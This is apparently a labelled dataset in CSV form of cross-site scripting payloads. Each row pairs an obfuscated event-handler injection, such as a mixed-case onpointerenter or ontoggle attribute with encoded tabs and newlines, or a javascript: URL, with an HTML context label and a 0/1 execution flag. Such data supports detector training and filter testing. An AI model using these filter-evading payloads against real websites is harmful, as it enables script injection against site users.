payload,context,exec,combined
<a%09OnPOintERenter%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnPOintERenter%09=%09(confirm)()>v3dm0s
<a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<htML%0donpOiNtEREnTER%0a=%0aa=prompt,a()>",html_attribute,0,"CTX_html_attribute CTX_html_attribute CTX_html_attribute <htML%0donpOiNtEREnTER%0a=%0aa=prompt,a()>"
<htmL/+/oNPoInteRenTER%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL/+/oNPoInteRenTER%0a=%0aconfirm()//
<a%09onMOuSEOveR%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09onMOuSEOveR%0d=%0dconfirm()>v3dm0s
"<A%0doNpointereNTER+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0doNpointereNTER+=+a=prompt,a()>v3dm0s"
<detAIls%0dOnPointEReNtEr%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAIls%0dOnPointEReNtEr%0d=%0dconfirm()%0dx>
<hTmL/+/oNMOusEOVeR+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL/+/oNMOusEOVeR+=+confirm()>
<hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//
<D3v%09ONPoIntereNTER+=+(confirm)()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%09ONPoIntereNTER+=+(confirm)()%0dx>v3dm0s
<d3v%0aONMoUsEoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aONMoUsEoVEr%0d=%0dconfirm()%0dx>v3dm0s
<HtmL%09OnpointerENTeR%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09OnpointerENTeR%09=%09confirm()//
<hTML%0aoNPoInTerENtEr%09=%09confirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTML%0aoNPoInTerENtEr%09=%09confirm()%0dx//
<svg><script>alert(1)</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <svg><script>alert(1)</script>
"<deTails%09OntOggLe%09=%09a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <deTails%09OntOggLe%09=%09a=prompt,a()%0dx//"
<DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>
<A%0aONPOiNTerentER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONPOiNTerentER%09=%09confirm()>v3dm0s
<D3v%0donMOuSeOvER+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0donMOuSeOvER+=+(prompt)``%0dx>v3dm0s
<HtML/+/onPOIntereNtEr%09=%09(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML/+/onPOIntereNtEr%09=%09(confirm)()%0dx>
<d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s
<D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s
<hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>
<HtMl/+/OnPoINTErEnTER+=+[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl/+/OnPoINTErEnTER+=+[8].find(confirm)%0dx//
<hTMl/+/ONMOUSEOver+=+(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl/+/ONMOUSEOver+=+(prompt)``//
<D3V%0aoNMoUSeoVER+=+[8].find(confirm)>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aoNMoUSeoVER+=+[8].find(confirm)>v3dm0s
<d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s
<A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s
"<A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%09ONmOUsEOvEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<dEtaILs%0aONpoInterEnTEr+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dEtaILs%0aONpoInterEnTEr+=+a=prompt,a()//"
<d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,url_href,0,CTX_url_href CTX_url_href CTX_url_href <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
<DETAILs%0aONtOgGlE%0a=%0a(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAILs%0aONtOgGlE%0a=%0a(confirm)()%0dx//
<DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>
<a%09OnmOUsEOvEr%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09OnmOUsEOvEr%09=%09(prompt)``>v3dm0s
<D3V%09ONmousEOvER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09ONmousEOvER%0a=%0aconfirm()>v3dm0s
<D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s
<DeTaIls%0doNTOGgLe%0d=%0dconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTaIls%0doNTOGgLe%0d=%0dconfirm()>
"<A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s"
<a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s
<html%0aonmouSEoVEr%0a=%0a[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0aonmouSEoVEr%0a=%0a[8].find(confirm)%0dx>
<D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0donpOInTErEnteR%09=%09confirm()%0dx>v3dm0s
<DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
<A%09onmOUSEOver+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09onmOUSEOver+=+confirm()%0dx>v3dm0s
<A/+/OnMOUsEOVER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/OnMOUsEOVER%0a=%0a[8].find(confirm)>v3dm0s
<D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/onmOUseOVeR%0a=%0a(confirm)()%0dx>v3dm0s
<a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnpointeRenTER%0d=%0d(prompt)``%0dx>v3dm0s
<htmL%09onPOiNTERENTER%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%09onPOiNTERENTER%09=%09confirm()%0dx//
<A%0aoNMoUsEover%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNMoUsEover%0a=%0aconfirm()%0dx>v3dm0s
<A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONPOinterentEr%0d=%0dconfirm()>v3dm0s
<a%0aONpOInTEREnTER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aONpOInTEREnTER%0a=%0aconfirm()>v3dm0s
"<dETAiLS%0dONtogGLe+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETAiLS%0dONtogGLe+=+a=prompt,a()//"
<A/+/onmOuseoVEr%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onmOuseoVEr%0d=%0d(confirm)()%0dx>v3dm0s
<html/+/oNpOiNteReNTER%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html/+/oNpOiNteReNTER%0a=%0aconfirm()%0dx>
<a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
"<DEtaILs/+/ONPOintEreNtEr%0d=%0da=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DEtaILs/+/ONPOintEreNtEr%0d=%0da=prompt,a()%0dx>"
<a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09oNMOuSEOvEr%0d=%0dconfirm()%0dx>v3dm0s
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
""" onwheel=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onwheel=alert(1) """
javascript:,html_text,0,CTX_html_text CTX_html_text CTX_html_text javascript:
"<A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%09OnMoUsEoVeR%0d=%0da=prompt,a()>v3dm0s"
<D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
"<D3v/+/onmOUseOvER+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/onmOUseOvER+=+a=prompt,a()>v3dm0s"
<HtmL%0aonPOiNterentER%0a=%0a(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonPOiNterentER%0a=%0a(confirm)()//
<D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dOnpOINterEnTEr%09=%09[8].find(confirm)>v3dm0s
<A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s
"<D3V%0aONmouseovER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0aONmouseovER%0d=%0da=prompt,a()%0dx>v3dm0s"
<DeTails%09ONToGGlE%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTails%09ONToGGlE%09=%09[8].find(confirm)>
"<a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
<A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<DEtAILs%0aONPoINtEreNTeR%0a=%0a[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAILs%0aONPoINtEreNTeR%0a=%0a[8].find(confirm)%0dx//
javascript:alert(1),url_href,1,CTX_url_href CTX_url_href CTX_url_href javascript:alert(1)
<a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aOnPOInTeReNtEr%0d=%0dconfirm()>v3dm0s
<dEtaiLs/+/OnToggle%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaiLs/+/OnToggle%09=%09[8].find(confirm)%0dx//
<D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s
<a%0donpoInTerENtER+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donpoInTerENtER+=+confirm()>v3dm0s
<A%0aONPOiNTerentER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONPOiNTerentER%09=%09confirm()>v3dm0s
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<DetAils%09ONPoinTeRenTER+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAils%09ONPoinTeRenTER+=+confirm()%0dx>
<D3V%0aOnpOINteRENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aOnpOINteRENTeR%0a=%0aconfirm()>v3dm0s
<A%0dOnmouSeOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnmouSeOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3V/+/ONpOINtERENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONpOINtERENTeR%0a=%0aconfirm()>v3dm0s
<hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//
"<A%0aonMOUsEovER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonMOUsEovER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aoNMOuseoVeR%0a=%0a[8].find(confirm)%0dx>v3dm0s
&#60;img&#62;,html_text,0,CTX_html_text CTX_html_text CTX_html_text &#60;img&#62;
<d3v%0donPoiNTErENteR+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0donPoiNTErENteR+=+confirm()>v3dm0s
onblur=alert(1),html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag onblur=alert(1)
<HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>
<A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aONPOiNtereNTeR%0a=%0aconfirm()%0dx>v3dm0s
"<D3V%0aOnpOINTeREnTER+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <D3V%0aOnpOINTeREnTER+=+a=prompt,a()%0dx>v3dm0s"
"<A/+/onpoinTErENtER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A/+/onpoinTErENtER%09=%09a=prompt,a()%0dx>v3dm0s"
<A%09ONpOintErentER%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09ONpOintErentER%0d=%0dconfirm()>v3dm0s
